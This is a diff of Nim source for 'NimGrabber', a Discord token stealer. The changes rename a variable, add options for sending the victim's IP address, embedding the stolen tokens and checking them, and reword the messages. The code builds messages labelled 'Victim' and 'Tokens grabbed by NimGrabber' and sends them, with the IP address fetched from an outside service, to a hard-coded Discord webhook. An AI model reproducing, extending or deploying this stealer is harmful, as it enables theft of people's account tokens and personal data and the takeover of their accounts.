@@ -9,11 +9,13 @@ from strutils import replace, endswith, strip
 # -----------------------
 let 
   webhook = "https://discord.com/api/webhooks/489398398492932/you-only-live-once"
-  userid: int64 = 87284798287919821
+  user_id: int64 = 87284798287919821
   
-const ## Possible options: "Y, N"
-  sendIP: char = 'N' 
-  embed:  char = 'N'
+    #> Possible options for these: "Y, N"
+const 
+  sendIP: char = 'N' ## Send IP Address to webhook 
+  embed:  char = 'N' ## Send the tokens in a fancy embed
+  check:  char = 'N' ## Check the tokens in victim's PC 
   
 # Do not touch the following
 # --------------------------
@@ -76,17 +78,17 @@ hooktks = &"```\n{hooktks.strip(leading=false)}```"
 
 when sendIP == 'Y': 
     let ip: string = fetch("https://api.ipify.org/")
-    let begin = &"<@{userid}> Victim: **{user}** | IP Address: **{ip}** \n**__Tokens grabbed by NimGrabber__**:\n"
+    let begin = &"<@{user_id}> Victim: **{user}** | IP Address: **{ip}** \n**__Tokens grabbed by NimGrabber__**:\n"
 else:
     let ip: string = "Not Enabled"
-    let begin = &"<@{userid}> Victim: **{user}**\n**__Tokens grabbed by NimGrabber__**:\n"
+    let begin = &"<@{user_id}> Victim: **{user}**\n**__Tokens grabbed by NimGrabber__**:\n"
     
 when embed == 'Y':
     var data = %*{ 
-        "username": "Nim666",
-        "content": &"<@{userid}>",
+        "username": "Nim666", 
+        "content": &"<@{user_id}>",
         "embeds": [
-            {
+            { 
                 "title": "__**NimGrabber (By NullCode)**__",
                 "fields": [
                     {
@@ -103,7 +105,7 @@ when embed == 'Y':
                 ]
             },
             {
-                "title": "__**Tokens grabbed by NimGrabber**__",
+                "title": "__**Tokens Grabbed:**__",
                 "fields": [
                     {
                         "name": "Total tokens: " & $tokens.len, 
